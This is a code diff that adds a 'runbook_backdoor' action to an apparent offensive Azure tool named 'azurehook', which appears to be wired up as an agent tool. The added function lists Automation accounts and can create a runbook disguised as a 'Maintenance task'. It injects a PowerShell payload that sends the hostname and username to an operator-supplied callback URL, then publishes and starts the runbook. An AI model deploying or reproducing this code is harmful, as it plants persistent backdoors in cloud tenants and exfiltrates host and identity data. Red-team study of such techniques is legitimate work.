@@ -266,6 +266,116 @@ async function managedIdentity(args: string[]): Promise<HookResult> {
   return { output: output.join("\n"), findings: [] }
 }
 
+async function runbookBackdoor(args: string[], timeout: number): Promise<HookResult> {
+  const sub = argVal(args, "--subscription-id")
+  const automationAccount = argVal(args, "--automation-account")
+  const resourceGroup = argVal(args, "--resource-group")
+  const runbookName = argVal(args, "--runbook-name") || "cs-maintenance"
+  const callbackUrl = argVal(args, "--callback-url")
+  const method = argVal(args, "--method") || "inject"
+  const output: string[] = []
+
+  if (method === "list") {
+    output.push("[*] Listing Automation Accounts...")
+    const accts = await az(["automation", "account", "list"], sub, timeout)
+    if (accts.exitCode !== 0) {
+      output.push(`[-] Failed to list automation accounts: ${accts.stderr.slice(0, 200)}`)
+      return { output: output.join("\n"), findings: [] }
+    }
+    const accounts = JSON.parse(accts.stdout)
+    output.push(`[+] Found ${accounts.length} automation account(s)`)
+    for (const a of accounts) {
+      output.push(`    ${a.name} (${a.resourceGroup}) — state: ${a.state}`)
+      const rbs = await az(["automation", "runbook", "list", "--automation-account-name", a.name, "--resource-group", a.resourceGroup], sub, timeout)
+      if (rbs.exitCode === 0) {
+        const runbooks = JSON.parse(rbs.stdout)
+        output.push(`      Runbooks: ${runbooks.length}`)
+        for (const r of runbooks) output.push(`        - ${r.name} (${r.runbookType}, state: ${r.state})`)
+      }
+    }
+    return { output: output.join("\n"), findings: [] }
+  }
+
+  if (!automationAccount || !resourceGroup) {
+    output.push("[-] --automation-account and --resource-group required for inject/create. Use --method list to find them.")
+    return { output: output.join("\n"), findings: [] }
+  }
+
+  if (!callbackUrl) {
+    output.push("[-] --callback-url required for runbook payload")
+    return { output: output.join("\n"), findings: [] }
+  }
+
+  const payload = `
+$req = [System.Net.WebRequest]::Create("${callbackUrl}")
+$req.Method = "POST"
+$hostname = $env:COMPUTERNAME
+$user = $env:USERNAME
+$body = [System.Text.Encoding]::UTF8.GetBytes("host=$hostname&user=$user&type=runbook")
+$req.ContentType = "application/x-www-form-urlencoded"
+$req.ContentLength = $body.Length
+$stream = $req.GetRequestStream()
+$stream.Write($body, 0, $body.Length)
+$stream.Close()
+$req.GetResponse() | Out-Null
+`.trim()
+
+  if (method === "create") {
+    output.push(`[*] Creating runbook ${runbookName}...`)
+    const create = await az([
+      "automation", "runbook", "create",
+      "--automation-account-name", automationAccount,
+      "--resource-group", resourceGroup,
+      "--name", runbookName,
+      "--type", "PowerShell",
+      "--description", "Maintenance task",
+    ], sub, timeout)
+    if (create.exitCode !== 0) {
+      output.push(`[-] Create failed: ${create.stderr.slice(0, 200)}`)
+      return { output: output.join("\n"), findings: [] }
+    }
+    output.push("[+] Runbook created")
+  }
+
+  output.push(`[*] Replacing runbook content with payload...`)
+  const tmpFile = `/tmp/cs-runbook-${Date.now()}.ps1`
+  await Bun.write(tmpFile, payload)
+  const replace = await az([
+    "automation", "runbook", "replace-content",
+    "--automation-account-name", automationAccount,
+    "--resource-group", resourceGroup,
+    "--name", runbookName,
+    "--content", `@${tmpFile}`,
+  ], sub, timeout)
+  if (replace.exitCode !== 0) {
+    output.push(`[-] Content replace failed: ${replace.stderr.slice(0, 200)}`)
+    return { output: output.join("\n"), findings: [] }
+  }
+  output.push("[+] Payload injected")
+
+  const publish = await az([
+    "automation", "runbook", "publish",
+    "--automation-account-name", automationAccount,
+    "--resource-group", resourceGroup,
+    "--name", runbookName,
+  ], sub, timeout)
+  if (publish.exitCode !== 0) {
+    output.push(`[-] Publish failed: ${publish.stderr.slice(0, 200)}`)
+    return { output: output.join("\n"), findings: [] }
+  }
+  output.push("[+] Runbook published")
+
+  const start = await az([
+    "automation", "runbook", "start",
+    "--automation-account-name", automationAccount,
+    "--resource-group", resourceGroup,
+    "--name", runbookName,
+  ], sub, timeout)
+  output.push(start.exitCode === 0 ? "[+] Runbook started" : `[-] Start failed: ${start.stderr.slice(0, 200)}`)
+
+  return { output: output.join("\n"), findings: [] }
+}
+
 // ── Tool definition ──
 
 const programKeys = Object.keys(PROGRAMS) as [Program, ...Program[]]
@@ -300,7 +410,7 @@ export const AzurehookTool = Tool.define("azurehook", {
       keyvault_dump: () => keyvaultDump(params.args, params.timeout_seconds),
       storage_dump: () => storageDump(params.args, params.timeout_seconds),
       managed_identity: () => managedIdentity(params.args),
-      runbook_backdoor: () => stub("runbook_backdoor"),
+      runbook_backdoor: () => runbookBackdoor(params.args, params.timeout_seconds),
       azuread_token: () => stub("azuread_token"),
       cleanup_azure: () => stub("cleanup_azure"),
     }
